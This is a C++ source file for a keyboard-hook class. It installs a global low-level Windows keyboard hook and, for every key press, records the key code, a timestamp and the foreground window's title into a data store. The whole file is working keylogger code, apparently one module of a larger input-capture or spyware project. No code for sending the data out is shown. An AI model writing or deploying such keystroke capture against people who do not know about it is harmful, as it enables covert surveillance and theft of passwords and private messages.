#include "KbHooker.hpp"
KbHooker::KbHooker(void) : ADataHooker() {}

void			KbHooker::startHook()
{
	if (!(_hooker = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardHookProc, NULL, 0)))
		return;
}

void			KbHooker::stopHook() {
	UnhookWindowsHookEx(_hooker);
}

LRESULT CALLBACK KbHooker::keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {

	if (!KbHooker::checkIsActivated(gControlData->_state.isKbActivated()))
		return (CallNextHookEx(NULL, nCode, wParam, lParam));

	PKBDLLHOOKSTRUCT kbdStruct = (PKBDLLHOOKSTRUCT)(lParam); //Pointer on Keyboard Struct
	HWND winHandle = GetForegroundWindow(); // Handle of actual windows
	std::pair<int, int> pos(-1, -1);
	char buff[MAXLENGTH];

	memset(buff, 0, sizeof(buff));
	GetWindowText(winHandle, buff, MAXLENGTH); // Transform window handle to readable data //
	
	if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
		auto newInput = std::make_shared<WindowsInput>(static_cast<int>(kbdStruct->vkCode), pos, KbHooker::getCurrTimestamp(), buff);
		KbHooker::pushMyData(newInput);
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

